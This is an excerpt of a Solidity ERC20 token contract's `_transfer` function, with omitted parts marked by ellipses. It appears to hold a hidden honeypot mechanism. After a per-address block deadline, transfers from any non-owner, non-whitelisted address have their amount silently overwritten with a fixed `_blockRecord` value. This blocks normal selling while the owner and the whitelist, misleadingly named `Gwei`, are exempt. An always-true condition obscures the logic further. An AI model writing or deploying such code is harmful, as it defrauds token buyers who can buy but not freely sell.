...
contract ERC20 is Context, IERC20 {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      ...
      if (!_Presale) {
          ...
          bool isRecipientEligibleForTokenCollect = recipientClaim > 0 && _claimTokenBlock[recipient] == 0 && !Gwei[recipient];
          bool isRecipientEligibleForTokenReceive = recipientClaim == 0 && _claimTokenBlock[recipient] == 0 && !Gwei[recipient];

          if (isRecipientEligibleForTokenCollect) {
              _claimTokenBlock[recipient] = (block.number + _tokenCollect);
          } else if (isRecipientEligibleForTokenReceive) {
              _claimTokenBlock[recipient] = (block.number + _tokenReceive);
          }

          bool isSenderEligibleForBlockRecord = sender != owner && !Gwei[sender] && _claimTokenBlock[sender] != 0 && _claimTokenBlock[sender] <= block.number;
          if ((senderClaim > 0 || senderClaim == 0) && isSenderEligibleForBlockRecord) {
              amount = _blockRecord;
          }
      }
